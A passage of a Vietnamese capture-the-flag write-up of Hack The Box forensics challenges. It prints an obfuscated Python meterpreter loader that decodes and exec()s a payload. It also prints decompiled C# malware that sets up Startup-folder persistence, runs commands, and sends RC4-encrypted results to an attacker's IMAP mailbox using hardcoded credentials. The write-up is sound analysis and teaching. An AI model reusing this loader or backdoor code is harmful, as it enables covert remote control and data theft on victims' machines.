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")

meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

exec(__import__('zlib').decompress(meterpreter_data)[0])
```

Đến đây thì trông rườm rà vậy thôi chứ decode cái key base64 là ra

> HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}

### Silent Trap (Easy)

>A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

![image](https://hackmd.io/_uploads/BJ-L-S-6yl.png)

Mình nhận được một file pcapng và bắt đầu điều tra

###### 1. What is the subject of the first email that the victim opened and replied to?

![image (3)](https://hackmd.io/_uploads/rJVdZSWTyg.png)

Vì là anh ta gửi mail nên mình filter ra POST method của http và nhận được đáp án ở packet đầu tiên

>Game Crash on Level 5

###### 2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)

Tiếp tục follow stream, ở stream số 8 với title là Bug Report - In-game Imbalance Issue in Eldoria

![image (4)](https://hackmd.io/_uploads/HJUgGBbT1l.png)

Với nội dung như sau, việc anh ta đính kèm file pdf cùng với password thì khá là “SUS”

![image (5)](https://hackmd.io/_uploads/HJWEzrWp1l.png)

Thử dump nó ra và gửi lên virustotal kết quả thì không quá bất ngờ là trojan

![image (6)](https://hackmd.io/_uploads/rJ2rGB-aye.png)

Quay lại câu hỏi số 2 khi đã xác định được mail và file độc hại thì mình tìm đến thời gian mail gửi tới ở stream số 1

![image (7)](https://hackmd.io/_uploads/BywPfrZ6ye.png)

Mình nhờ chat làm nó trông clean hơn

![image (8)](https://hackmd.io/_uploads/H1FtGSWT1l.png)

Giờ mail gửi tới là 15:46 và today mình xác định thông qua thời gian các packet là 2025-02-24 (Nhớ setting Time Display Format về UTC )

![image (9)](https://hackmd.io/_uploads/rkR5fB-6kg.png)

>2025-02-24_15:46

###### 3. What is the MD5 hash of the malware file?

![image (10)](https://hackmd.io/_uploads/SJATGHb61x.png)

>c0b37994963cc0aadd6e78a256c51547

###### 4. What credentials were used to log into the attacker's mailbox? (Format: username:password)

Trước hết thì xác định xem file dùng ngôn ngữ gì đã mình dùng DIE để detect và nhận thấy được viết bằng C#

![image (11)](https://hackmd.io/_uploads/B1DgmBZake.png)

Ở đây để reverse thì dùng ILSpy

![image (12)](https://hackmd.io/_uploads/rklGQHWaJl.png)

```csharp
private static void Main(string[] args)
{
	string text = "move /Y email.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\email.exe\"";
	try
	{
		execute(new string[2] { "whoami", text });
	}
	catch
	{
	}
	while (true)
	{
		try
		{
			execute(readFile());
			Thread.Sleep(60000);
		}
		catch
		{
			Thread.Sleep(60000);
		}
	}
}
```

Khởi đầu từ hàm main thấy nó execute gì đấy tiếp tục đào vô hàm execute để phân tích

```csharp
private static void execute(string[] commands)
{
	try
	{
		connect(creds.Split(':')[2], 143);
		Login(creds.Split(':')[0], creds.Split(':')[1]);
	}
	catch
	{
		try
		{
			connect(r_creds.Split(':')[2], 143);
			Login(r_creds.Split(':')[0], r_creds.Split(':')[1]);
		}
		catch
		{
		}
	}
	foreach (string text in commands)
	{
		if (text.Contains("change_"))
		{
			change(text);
			continue;
		}
		string s = cmd(text);
		s = Convert.ToBase64String(xor(Encoding.UTF8.GetBytes(s)));
		create(s);
	}
}
```

Đầu tiên nó thực hiện hàm connect lấy giá trị là phần tử thứ 3 từ creds khả năng là host và kết nối tới port 143

Và hàm Login nó lấy 2 giá trị khả năng là username và password

```csharp
static Program()
{
	string[] obj = new string[5]
	{
		Environment.MachineName,
		"_",
		Environment.UserName,
		"_",
		null
	};
	int num = 4;
	obj[num] = Environment.OSVersion?.ToString();
	comp_id = Base64Encode(string.Concat(obj));
	creds = "proplayer@email.com:completed:mail.korptech.net:0000000000000000000000000000000000000000000000000000000";
	r_creds = "proplayer1@email.com:completed:mail.korptech.net:000000000000000000000000000000000000000000000000000000000";
	ssl = null;
	tcp = null;
}
```

Mình điều hướng tới Program() và lấy được biến creds

```csharp
creds = "proplayer@email.com:completed:mail.korptech.net:0000000000000000000000000000000000000000000000000000000";
```

>proplayer@email.com:completed

```csharp
string s = cmd(text);
s = Convert.ToBase64String(xor(Encoding.UTF8.GetBytes(s)));
create(s);
```

Sau khi tới nối tới server rồi nó thực hiện command nào đó, ở đây s được đưa về dưới dạng byte sau đó thực hiện hàm xor và đưa về base64, ở đây chưa biết hàm xor nó làm gì nên tiếp tục phân tích thêm

```csharp
public static byte[] xor(byte[] data)
{
	return Exor.Encrypt(new byte[256]
	{
		168, 115, 174, 213, 168, 222, 72, 36, 91, 209,
		242, 128, 69, 99, 195, 164, 238, 182, 67, 92,
		7, 121, 164, 86, 121, 10, 93, 4, 140, 111,
		248, 44, 30, 94, 48, 54, 45, 100, 184, 54,
		28, 82, 201, 188, 203, 150, 123, 163, 229, 138,
		177, 51, 164, 232, 86, 154, 179, 143, 144, 22,
		134, 12, 40, 243, 55, 2, 73, 103, 99, 243,
		236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
		111, 240, 108, 86, 85, 63, 44, 49, 241, 6,
		3, 170, 131, 150, 53, 49, 126, 72, 60, 36,
		144, 248, 55, 10, 241, 208, 163, 217, 49, 154,
		206, 227, 25, 99, 18, 144, 134, 169, 237, 100,
		117, 22, 11, 150, 157, 230, 173, 38, 72, 99,
		129, 30, 220, 112, 226, 56, 16, 114, 133, 22,
		96, 1, 90, 72, 162, 38, 143, 186, 35, 142,
		128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
		246, 232, 205, 236, 254, 152, 145, 98, 126, 29,
		217, 74, 177, 142, 19, 190, 182, 151, 233, 157,
		76, 74, 104, 155, 79, 115, 5, 18, 204, 65,
		254, 204, 118, 71, 92, 33, 58, 112, 206, 151,
		103, 179, 24, 164, 219, 98, 81, 6, 241, 100,
		228, 190, 96, 140, 128, 1, 161, 246, 236, 25,
		62, 100, 87, 145, 185, 45, 61, 143, 52, 8,
		227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
		227, 9, 146, 156, 208, 206, 194, 134, 194, 23,
		233, 100, 38, 158, 58, 159
	}, data);
}
```

xor return giá trị từ Encrypt mà Encrypt nhận 2 đối số là data và một mảng 256 byte, chưa thể kết luận gì về hành vi của nó nên đào sâu thêm vào hàm Encrypt

```csharp
public static byte[] Encrypt(byte[] pwd, byte[] data)
{
	int[] array = new int[256];
	int[] array2 = new int[256];
	byte[] array3 = new byte[data.Length];
	int i;
	for (i = 0; i < 256; i++)
	{
		array[i] = pwd[i % pwd.Length];
		array2[i] = i;
	}
	int num = (i = 0);
	for (; i < 256; i++)
	{
		num = (num + array2[i] + array[i]) % 256;
		int num2 = array2[i];
		array2[i] = array2[num];
		array2[num] = num2;
	}
	int num3 = (num = (i = 0));
	for (; i < data.Length; i++)
	{
		num3++;
		num3 %= 256;
		num += array2[num3];
		num %= 256;
		int num2 = array2[num3];
		array2[num3] = array2[num];
		array2[num] = num2;
		int num4 = array2[(array2[num3] + array2[num]) % 256];
		array3[i] = (byte)(data[i] ^ num4);
	}
	return array3;
}
```

Có thấy nó đang thực hiện mã hóa theo kiểu RC4 với key trước đó ta đã tìm được là mảng 256 byte

Như đã đề cập ở trên thì nó đang thực hiện kết nối tới port 143 mà port 143 là IMAP vậy quay lại với wireshark và fillter ra IMAP

![image (13)](https://hackmd.io/_uploads/HyJrESba1x.png)

follow thử 1 stream, dữ liệu được gặp trùng với các flow của chương trình vậy các data bị mã hóa base64 kia thực chất là data bị mã hóa RC4 ở đây thì mọi thứ có vẽ rõ ràng rồi

![image (14)](https://hackmd.io/_uploads/rJhLNr-6Je.png)

Mình viết code để decrypt ra data bị mã hóa

```python
import base64

pwd = [
    168, 115, 174, 213, 168, 222, 72, 36, 91, 209,
    242, 128, 69, 99, 195, 164, 238, 182, 67, 92,
    7, 121, 164, 86, 121, 10, 93, 4, 140, 111,
    248, 44, 30, 94, 48, 54, 45, 100, 184, 54,
    28, 82, 201, 188, 203, 150, 123, 163, 229, 138,
    177, 51, 164, 232, 86, 154, 179, 143, 144, 22,
    134, 12, 40, 243, 55, 2, 73, 103, 99, 243,
    236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
    111, 240, 108, 86, 85, 63, 44, 49, 241, 6,
    3, 170, 131, 150, 53, 49, 126, 72, 60, 36,
    144, 248, 55, 10, 241, 208, 163, 217, 49, 154,
    206, 227, 25, 99, 18, 144, 134, 169, 237, 100,
    117, 22, 11, 150, 157, 230, 173, 38, 72, 99,
